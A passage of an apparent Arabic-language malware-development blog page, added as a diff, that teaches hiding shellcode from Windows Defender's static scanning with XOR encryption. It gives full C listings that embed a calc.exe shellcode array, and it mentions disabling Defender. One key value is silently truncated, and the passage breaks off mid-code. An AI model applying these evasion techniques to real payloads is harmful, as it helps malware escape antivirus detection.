@@ -1,0 +1,1804 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payload Encryption</title>
+    <link rel="icon" href="../src/Pics/PayEnc.jpg" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet"
+        crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+    <style>
+        html,
+        body {
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            overflow-x: hidden;
+        }
+
+        nav {
+            width: 100%;
+            height: 10vh;
+            position: sticky;
+        }
+
+        .nav-container {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: bold;
+            cursor: pointer;
+            background: -webkit-linear-gradient(#16ff00, #ffed00);
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .logo span {
+            cursor: pointer;
+            background: -webkit-linear-gradient(#16ff00, #ffed00);
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hamburg,
+        .cancel {
+            cursor: pointer;
+            position: absolute;
+            right: 15px;
+            top: 10px;
+            color: #16ff00;
+            display: none;
+            font-size: clamp(2.5rem, 0.5rem + 5vw, 3rem);
+        }
+
+        .nav-container .links {
+            display: flex;
+        }
+
+        .nav-container .links a {
+            font-size: 1.2rem;
+            color: white;
+            margin: 0 20px;
+            text-decoration: none;
+            font-weight: 550;
+            transition: 0.3s linear;
+        }
+
+        .nav-container .links a:hover {
+            color: #16ff00;
+            border-bottom: 2px solid #16ff00;
+        }
+
+        .dropdown {
+            max-height: 100vh;
+            overflow-y: auto;
+            z-index: 100;
+            position: absolute;
+            top: 0;
+            transform: translateY(-500px);
+            width: 100%;
+            height: auto;
+            backdrop-filter: blur(4px) brightness(40%);
+            box-shadow: 0 0 20px black;
+            transition: 0.2s linear;
+        }
+
+        .dropdown .links a {
+            display: flex;
+            color: white;
+            text-decoration: none;
+            padding: 15px 0;
+            justify-content: center;
+            align-items: center;
+            transition: 0.2s linear;
+        }
+
+        .dropdown .links a:hover {
+            background-color: #16ff00;
+            color: black;
+        }
+
+        .dark-mode {
+            background-color: #222;
+            color: #f4f4f4;
+        }
+
+        header {
+            background: -webkit-linear-gradient(#16ff00, #ffed00);
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-align: center;
+            border-bottom: 1px solid #16ff00;
+        }
+
+
+
+        header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+
+
+        .article {
+            background: white;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .article h2 {
+            margin-top: 0;
+            border-top: 2px solid #16ff00;
+            border-bottom: 2px solid #16ff00;
+            padding-bottom: 5px;
+        }
+
+        .code-block {
+            background: #16ff00;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+            direction: ltr;
+            text-align: left;
+            font-size: 15px;
+        }
+
+
+        @media (max-width:884px) {
+            nav .logo {
+                position: absolute;
+                top: 16px;
+                left: 15px;
+                font-size: 1.5rem;
+            }
+
+            .nav-container .links {
+                display: none;
+            }
+
+            .hamburg,
+            .cancel {
+                display: block;
+            }
+
+        }
+
+
+        @media (max-width:440px) {
+            .nav-container {
+                margin-top: 10px;
+            }
+
+            table {
+                max-width: 100%;
+                display: block;
+                overflow-x: auto;
+            }
+        }
+
+        .footer {
+            background: #111;
+            color: #fff;
+            text-align: center;
+            padding: 5px;
+            position: relative;
+            bottom: 0;
+            width: 100%;
+            margin-top: auto;
+        }
+
+        .footer a {
+            color: #16ff00;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .footer a:hover {
+            color: #35a849;
+        }
+
+        .ltr {
+            direction: ltr;
+            text-align: left;
+        }
+
+        .article-image {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+
+        .nav-buttons a {
+            background: #16ff00;
+            color: black;
+            padding: 10px 0;
+            border-radius: 5px;
+            text-decoration: none;
+            transition: background-color 0.3s;
+            text-align: center;
+            flex: 1;
+            margin: 0 10px;
+            max-width: 150px;
+            font-size: 20px;
+        }
+
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .nav-buttons a:hover {
+            background: #35a849;
+        }
+
+        .download-link {
+            text-decoration: none;
+            color: #14aa2d;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+
+        .download-link:hover {
+            color: #16ff00;
+            text-decoration: underline;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 10px auto;
+            text-align: center;
+
+
+        }
+
+        th,
+        td {
+            border: 1px solid black;
+            padding: 7px;
+        }
+
+        th {
+            background-color: #16ff00;
+        }
+    </style>
+</head>
+
+<body>
+    <section>
+        <nav>
+            <div class="nav-container" style="direction: ltr;">
+                <div class="logo" data-aos="zoom-in" data-aos-duration="800">
+                    <span>0x4de1</span>
+                </div>
+                <div class="links">
+                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100"><a
+                            href="https://0x4de1.github.io">Home</a></div>
+                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300"><a
+                            href="../MalDev.html">Mal Dev</a></div>
+                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="400"><a
+                            href="https://0x4de1.medium.com/" id="blogLink">CTF Writeups</a></div>
+                </div>
+            </div>
+            <i class="fa-solid fa-bars hamburg" onclick="hamburg()"></i>
+            <div class="dropdown">
+                <div class="links">
+                    <a href="https://0x4de1.github.io">Home</a>
+                    <a href="../MalDev.html">Mal Dev</a>
+                    <a href="https://0x4de1.medium.com">CTF Writeups</a>
+                    <i class="fa-solid fa-xmark cancel" onclick="cancel()"></i>
+                </div>
+            </div>
+        </nav>
+        <header>
+            <h1 id="article-title" style="direction: ltr;">Payload Encryption</h1>
+        </header>
+        <div class="container">
+            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                <img src="../src/Pics/PayEnc.jpg" alt="HomeLab" class="article-image" loading="lazy">
+            </div>
+            <div class="article" data-aos="zoom-in" data-aos-duration="800">
+                <p style="text-align: center; font-weight: bold;">السَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ
+                </p>
+                <p style="text-align: center; font-weight: bold;">اللَّهُمَّ صَلِّ عَلَى مُحَمَّدٍ وَعَلَى آلِ
+                    مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى إِبْرَاهِيمَ وَآلِ
+                    إِبْرَاهِيمَ، إِنَّكَ حَمِيدٌ مَجِيدٌ، وَبَارِكْ عَلَى مُحَمَّدٍ وَعَلَى آلِ مُحَمَّدٍ، كَمَا
+                    بَارَكْتَ عَلَى إِبْرَاهِيمَ وَآلِ إِبْرَاهِيمَ، إِنَّكَ حَمِيدٌ مَجِيدٌ،
+                </p>
+            </div>
+            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                <h2>Introduction</h2>
+                <p>[+] فـ المقالة اللـ فاتت كُنت قولتلك فـ جملة بين قوسين تقفل الـ Windows Defender ، أو تعمل للفولدر
+                    exclusive.</p>
+                <p>[+] فـ المقالة دي بقي ، هنتكلم عن إزاي نـ bypass الـ Static Analysis بتاع الويندوز عن طريق الـ
+                    Encryption.</p>
+                <p>وهنتكلم تحديدا عن:</p>
+                <ol style="direction: ltr; font-weight: bold;">
+                    <li>XOR Encryption :</li>
+                    <ol>
+                        <p>1.1 XOR Encryption By One Key.<br>
+                            1.2 XOR Encryption By I Key.<br>
+                            1.3 XOR Encryption By Multi Keys.</p>
+                    </ol>
+                    <li>RC4 Encryption :</li>
+                    <ol>
+                        <p>2.1 RC4 Encryption Via Custom Implementation.<br>
+                            2.2 RC4 Encryption Via SystemFunction032.<br>
+                            2.3 RC4 Encryption Via SystemFunction033.</p>
+                    </ol>
+                    <li>AES Encryption</li>
+                    <ol>
+                        <p>3.1 AES Encryption Via Bcrypt.lib<br>
+                            3.2 AES Encryption Via Imported Files.</p>
+                    </ol>
+                </ol>
+                <h2 style="direction: ltr;">1. XOR Encryption :</h2>
+                <p>[+] الـ XOR أو الـ Exclusive OR .. دي عملية منطقية بتشتغل ع بتّين وهما الـ 0 والـ 1 ، وبتدينا ناتج
+                    ع حسب القاعدة دي:</p>
+                <table>
+                    <tr>
+                        <th>A XOR B (A ^ B)</th>
+                        <th>B</th>
+                        <th>A</th>
+
+                    </tr>
+                    <tr>
+                        <td>0</td>
+                        <td>0</td>
+                        <td>0</td>
+
+                    </tr>
+                    <tr>
+                        <td>1</td>
+                        <td>1</td>
+                        <td>0</td>
+                    </tr>
+                    <tr>
+                        <td>1</td>
+                        <td>0</td>
+                        <td>1</td>
+                    </tr>
+                    <tr>
+                        <td>0</td>
+                        <td>1</td>
+                        <td>1</td>
+                    </tr>
+                </table>
+                <p>[+] أو زي مـ كانوا بيخلونا نبصمج فـ هندسة .. لو متشابهين بـ 0 ، ولو مختلفين بـ 1.</p>
+                <p style="font-weight: bold;">[+] طب ليه بنستخدم XOR في الـ Encryption؟</p>
+                <p>الميزة القوية في الـ XOR إنه عكسي بطبيعته ، بمعني إن لو شغلت الـ XOR ع Data بـ key معين ، تقدر ترجع
+                    الداتا الأصلية بنفس الـ key ونفس العملية .. وده بيخليها طريقة تشفير وفك تشفير بسيطة وسريعة.</p>
+                <p>[+] أعتقد إن كل الكلام ده إنت عارفُه .. تعالي ندخل ع العملي ونشوف الطرق اللـ هنتكلم فيها:</p>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">1.1 XOR Encryption By One Key :</h3>
+                <p>[+] فـ الطريقة دي بيكون معانا key واحد ثابت .. ودا فكرته إن كل بايت فـ الشيل كود بيتعملة XOR مع الكي
+                    ده .. ونفس الكي بنستخدمة عشان نشفر ونفك كمان .. يلا نبدأ فـ الخطوات:</p>
+                <ol>
+                    <li>هنكريت بروجيكت جديد ، هنضيف الـ <code
+                            style="background: #16ff00; font-size: 14px;">main.c</code> ، وهنشتغل ع <code
+                            style="background: #16ff00; font-size: 14px;">نفس الشيل كود</code> بتاع
+                        المقالة اللـ فاتت (ولو مش فاكر بيعمل إيه الشيل كود ده إرجع للمقالة) .. والـ key اللـ هشتغل بية
+                        هو <code style="background: #16ff00; font-size: 14px;">0x4de1</code>. </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/XorByOneKey1.png" alt="XorByOneKey1" class="article-image" loading="lazy">
+                    </div>
+                    <li>بعد كدا محتاجين نعمل <code style="background: #16ff00; font-size: 14px;">for loop</code> ،
+                        مهمتها إنها بتعدي ع كل بايت فـ الشيل كود وتعمله XOR مع الـ key.
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/XorByOneKey2.png" alt="XorByOneKey2" class="article-image" loading="lazy">
+                    </div>
+                    <li>آخر جزء الـ Main Function .. وفيها شوية داتا أطبعهم زي الـ address بتاع الشيل كود ..
+                        والعمليتين بتوع التشفير وفك التشفير.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/XorByOneKey3.png" alt="XorByOneKey3" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا بينا نـ رن الكود من الـ Local Windows Debugger.</p>
+                <ol>
+                    <li>دا العنوان فـ الميموري .. ونقدر نشوف الشيل كود بتاعنا قبل مـ تتم عملية الـ Encryption:</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/XorByOneKey4.png" alt="XorByOneKey4" class="article-image" loading="lazy">
+                    </div>
+                    <li>اضغط <code style="background: #16ff00; font-size: 14px;">Continue</code> ، بعدين <code
+                            style="background: #16ff00; font-size: 14px;">Enter</code> عشان تتم عملية التشفير .. بعد كدا
+                        وقف العملية وإرجع لنفس العنوان فـ
+                        الميموري هتلاقي بالفعل الشيل كود بتاعنا إتشفر.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/XorByOneKey5.png" alt="XorByOneKey5" class="article-image" loading="lazy">
+                    </div>
+                    <li>آخر حاجه .. هتعمل Continue و Enter تاني .. وقف وإرجع .. هتلاقي تم الفك بنجاح.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/XorByOneKey6.png" alt="XorByOneKey6" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] ودي كانت أول وأسهل وأبسط طريقة .. ودا الكود النهائي:</p>
+                <div class="code-block"><code>
+                    #include &lt;Windows.h&gt;<br>
+                    #include &lt;stdio.h&gt;<br>
+                    <br>
+                    unsigned char OurShellCode[] =<br>
+                    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                    "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";<br>
+                    <br>
+                    unsigned char key = 0x4de1;<br><br>
+                    VOID XorByOneKey(PBYTE pOurShellCode, SIZE_T sOurShellCodeSize, BYTE bkey) {<br>
+                        &nbsp;&nbsp;for (int i = 0; i < sOurShellCodeSize; i++) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;pOurShellCode[i] = pOurShellCode[i] ^ bkey;<br>
+                            &nbsp;&nbsp;}<br>
+                    }<br><br>
+
+
+                    int main() {<br>
+                        &nbsp;&nbsp;printf("[i] ShellCode Address : 0x%p \n", OurShellCode);<br>
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Encrypt .....");<br>
+                        &nbsp;&nbsp;getchar();<br><br>
+                        
+                        &nbsp;&nbsp;XorByOneKey(OurShellCode, sizeof(OurShellCode), key);<br>
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Decrypt .....");<br>
+                        &nbsp;&nbsp;getchar();<br><br>
+                        &nbsp;&nbsp;XorByOneKey(OurShellCode, sizeof(OurShellCode), key);<br>
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Quit .....");<br>
+                        &nbsp;&nbsp;getchar();<br><br>
+                        
+                        &nbsp;&nbsp;return 0;<br>
+                        }<br>
+                    
+            </code></div>
+                <br>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">1.2 XOR Encryption By I Key :</h3>
+                <p>[+] الطريقة اللـ فاتت كان الـ key واحد وثابت .. فـ كان سهل يتعمل <code
+                        style="background: #16ff00; font-size: 14px;">brute force</code> ويتعرف الكي.</p>
+                <p>[+] تعالي نصعب الموضوع أكتر سيكا ع الـ Antivirus .. فـ الطريقة دي بقي .. الـ key بيتغير مع كل بايت
+                    ودي عن طريق إني بستخدم متغير "i" فـ الـ for loop .. بمعني إن الكي لكل بايت بيكون معتمد ع موقعه أو
+                    مكانه فين فـ الداتا .. يعني من الآخر كدا كل بايت بيتشفر بقيمة مختفلة غير التاني .. وتعالي نشوف إزاي:
+                </p>
+                <ol>
+                    <li>الخطوة الأولي المعتادة زي كل مرة .. كريت بروجيكت جديد .. ضيف الـ <code
+                            style="background: #16ff00; font-size: 14px;">main.c</code> ، وهتاخد كوبي لكل الكود
+                        اللـ فات.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/XorByIKey1.png" alt="XorByIKey1" class="article-image" loading="lazy">
+                    </div>
+                    <li>هنعدل بس فـ الـ for loop .. وتحديدا هنزود i ع الـ key.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/XorByIKey2.png" alt="XorByIKey2" class="article-image" loading="lazy">
+                    </div>
+                    <li>دي نقطة بديهية بس قررت أقولها .. بما إننا فـ طريقة جديدة فـ غيرت إسم الفانكشن بتاعتنا بما يناسب
+                        اللـ بنتكلم عنه .. وطبعا بالمثل هتغير الاسامي فـ التشفير والفك.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/XorByIKey3.png" alt="XorByIKey3" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا نـ رن ونشوف:</p>
+                <ol>
+                    <li>هتلاحظ إن أول قيمة بعد التشفير وهي <code
+                            style="background: #16ff00; font-size: 14px;">0x1d</code> ، ودي نفس القيمة اللـ طلعت
+                        بالطريقة اللـ الأولي لإن
+                        مستخدمين نفس الكي .. منطقي يعني .. الإختلاف بقي فـ باقي القيم هتلاقيهم كلهم متغيرين وطبعا إنت
+                        فهمت ليه.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/XorByIKey4.png" alt="XorByIKey4" class="article-image" loading="lazy">
+                    </div>
+                    <li>ودا كدا بعد الفك .. وهتلاقي إن الدنيا تمام.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/XorByIKey5.png" alt="XorByIKey5" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] ودي كانت تاني طريقة .. ودا الكود النهائي:</p>
+                <div class="code-block"><code>
+                    #include &lt;Windows.h&gt;<br>
+                    #include &lt;stdio.h&gt;<br>
+                    <br>
+                    unsigned char OurShellCode[] =<br>
+                    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                    "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";<br>
+                    <br>
+                    unsigned char key = 0x4de1;<br><br>
+                    VOID XorByIKey(PBYTE pOurShellCode, SIZE_T sOurShellCodeSize, BYTE bkey) {<br>
+                        &nbsp;&nbsp;for (int i = 0; i < sOurShellCodeSize; i++) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;pOurShellCode[i] = pOurShellCode[i] ^ (bkey + i);<br>
+                            &nbsp;&nbsp;}<br>
+                    }<br><br>
+
+
+                    int main() {<br>
+                        &nbsp;&nbsp;printf("[i] ShellCode Address : 0x%p \n", OurShellCode);<br>
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Encrypt .....");<br>
+                        &nbsp;&nbsp;getchar();<br><br>
+                        
+                        &nbsp;&nbsp;XorByIKey(OurShellCode, sizeof(OurShellCode), key);<br>
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Decrypt .....");<br>
+                        &nbsp;&nbsp;getchar();<br><br>
+                        &nbsp;&nbsp;XorByIKey(OurShellCode, sizeof(OurShellCode), key);<br>
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Quit .....");<br>
+                        &nbsp;&nbsp;getchar();<br><br>
+                        
+                        &nbsp;&nbsp;return 0;<br>
+                        }<br>
+                    
+            </code></div>
+                <br>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">1.3 XOR Encryption By Multi Keys :</h3>
+                <p>[+] هنصعب الموضوع أكتر .. وهنستخدم فـ الطريقة دي أكتر من key .. وفكرتها إن الـ keys دول بيلفوا ع
+                    القيم واحد واحد لحد مـ عدد الـ keys يخلص .. ويرجع يلف من الأول.</p>
+                <p>[+] بمعني إن لو عندي عدد الـ keys مثلا 4 .. معني كدا إن أول كي هيشفر أول قيمة فـ الشيل كود .. والتاني
+                    مع
+                    القيمة التانية .. والتالته والرابعة كذلك .. هنيجي بقي ع القيمة رقم 5 فـ الشيل كود .. هترجع تتشفر
+                    بالكي رقم 1 وهكذا .. ولفي بينا يا دنيااا</p>
+                <ol>
+                    <li>الخطوه الأولي إنت عارفها أكيد .. تاني حاجه هنبدأ نعدل أول جزء وهو الـ key بدل واحد هيكون كذا
+                        واحد .. وفـ
+                        الحالة بتاعتي دي الكي دا <code
+                            style="background: #16ff00; font-size: 14px;">{ 0x04, 0x0d, 0x0e, 0x01 }</code></li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/XorByMultiKeys1.png" alt="XorByMultiKeys1" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>تاني جزء هنعدل فـ الفانكشن بتاعتنا .. بحيث هنعمل for loop ، فيه متغيرين ، واحد هيلف ع الشيل كود
+                        كله والتاني ع الـ keys.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/XorByMultiKeys2.png" alt="XorByMultiKeys2" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا نـ رن ونشوف:</p>
+                <ol style="font-weight: bold;">
+                    <li>ودا كدا حالة الـ Encryption:</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/XorByMultiKeys3.png" alt="XorByMultiKeys3" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>والـ Decryption:</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/XorByMultiKeys4.png" alt="XorByMultiKeys4" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] ودي كانت تالت وآخر طريقة .. ودا الكود النهائي:</p>
+                <div class="code-block"><code>
+                    #include &lt;Windows.h&gt;<br>
+                    #include &lt;stdio.h&gt;<br>
+                    <br>
+                    unsigned char OurShellCode[] =<br>
+                    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                    "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";<br>
+                    <br>
+                    unsigned char keys[] = { 0x04, 0x0d, 0x0e, 0x01 };<br><br>
+                    VOID XorByMultiKeys(PBYTE pOurShellCode, SIZE_T sOurShellCodeSize, PBYTE bKeys, SIZE_T skeySize) {<br>
+                        &nbsp;&nbsp;for (int i = 0, j = 0; i < sOurShellCodeSize; i++, j++) {<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;if (j >= skeySize) {<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j = 0;<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                        &nbsp;&nbsp;pOurShellCode[i] = pOurShellCode[i] ^ bKeys[j];<br>
+                        &nbsp;&nbsp;}<br>
+                    }<br><br>
+
+
+                    int main() {<br>
+                        &nbsp;&nbsp;printf("[i] ShellCode Address : 0x%p \n", OurShellCode);<br>
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Encrypt .....");<br>
+                        &nbsp;&nbsp;getchar();<br><br>
+                        
+                        &nbsp;&nbsp;XorByMultiKeys(OurShellCode, sizeof(OurShellCode), keys, sizeof(keys));<br>
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Decrypt .....");<br>
+                        &nbsp;&nbsp;getchar();<br><br>
+                        &nbsp;&nbsp;XorByMultiKeys(OurShellCode, sizeof(OurShellCode), keys, sizeof(keys));<br>
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Quit .....");<br>
